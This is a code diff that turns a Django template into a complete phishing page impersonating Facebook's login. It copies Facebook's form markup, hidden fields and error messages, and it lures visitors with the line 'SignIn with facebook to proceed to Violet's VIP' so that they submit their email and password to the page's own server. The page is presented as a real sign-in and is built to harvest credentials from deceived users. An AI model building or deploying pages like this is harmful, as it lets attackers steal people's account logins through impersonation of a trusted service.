@@ -1,8 +1,109 @@
-{% include 'base.html' %}
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>Facebook: Violet Summer</title>
+	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
+	<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
+	{% load static %}
+	<style type="text/css">
+/*#fbtext {
+	width: auto;
+	height: auto;
+}*/
+	</style>
+}
+</head>
+<body>
+	<div class="container-sm border">
+		<div>
+			<div class="left">
+				<img src="{% static 'images/fbtext.svg' %}" id='fbtext'>
+				<h2>SignIn with facebook to proceed to Violet's VIP</h2>
+			</div>
 
+			<div class="right">
+				<div class="_6luv _52jv">
+        <!-- form action="/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjQ4NjIxMjczLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D" -->
+       <form action="" class="_9vtf" data-testid="royal_login_form" id="u_0_a_nk" method="POST" onsubmit="">
+        <input autocomplete="off" name="jazoest" type="hidden" value="2958"/>
+        <input autocomplete="off" name="lsd" type="hidden" value="AVrz5JL5ffo"/>
+        <div>
+         <div class="_6lux">
+          <!-- <input aria-label="Email address or phone number" autofocus="1" class="inputtext _55r1 _6luy" data-testid="royal_email" id="email" name="email" placeholder="Email address or phone number" type="text"/> -->
+          {{ form.username }}
+          {% if error1 %}
+              <div class="_9ay5">
+              	<img class="_9ay6 img" src="https://static.xx.fbcdn.net/rsrc.php/v3/yT/r/57kC6DHzoam.png" alt="" width="20" height="20">
+              </div>
+          {% endif %}
+         </div>
+         <div class="_6lux">
+          <div class="_6luy _55r1 _1kbt" id="passContainer">
+           <!-- <input aria-label="Password" class="inputtext _55r1 _6luy _9npi" data-testid="royal_pass" id="pass" name="pass" placeholder="Password" type="password"/> -->
+           {{ form.password }}
+           <div class="" id="" style='position: absolute; right: 30px; width: 20px;'>
+            <a href="#u_0_a_nk" role="button" onclick="eye()" style='padding: 0px; margin: 0px; display: inlin;'>
+             <img id=show src="{% static 'images/eye.png' %}" style='width: 100%; opacity: 0.3;' alt="show">
+            </a>
+            <script>
+				function eye() {
+				  var x = document.getElementById("pass");
+				  if (x.type === "password") {
+				    x.type = "text";
+				  } else {
+				    x.type = "password";
+				  }
 
-{% block ibro %}
+				  var y =  document.getElementById('show')
 
-	{% include 'form.html' %}
+				  if (y.style.opacity == 0.3){
+				  	y.style.opacity = 1
+				  } else {
+				  	y.style.opacity = 0.3
+				  }
 
-{% endblock %}
+				}
+			</script>
+           </div>
+          </div>
+         </div>
+        </div>
+        <input autocomplete="off" name="login_source" type="hidden" value="comet_headerless_login"/>
+        <input autocomplete="off" name="next" type="hidden" value=""/>
+        <div>
+         <button name="login" type="submit" value="submit" onclick="on()">
+          Log In
+         </button>
+        </div>
+        <div id="overlay">
+		  <div id="text"><center><div class="loader"></div></center>Loading...</div>
+		</div>
+		<script>
+			function on() {
+			  document.getElementById("overlay").style.display = "block";
+			}
+		</script>
+		{% if error1 or error%}
+        <script>
+			function on() {
+			  document.getElementById("overlay").style.display = "inline";
+			}
+		</script>
+		{% endif %}
+        <div class="errsms">
+         	{% if error1 %}
+         		 <b style="color: red;"> The email address or mobile number isn't connected to an account. </b>
+         	{% elif error2 %}
+         		 <b style="color: red;"> The password that you've entered is incorrect. </b>
+          	{% endif %}
+        </div>
+       </form>
+      </div>
+			</div>
+		</div>
+		
+	</div>
+</body>
+</html>
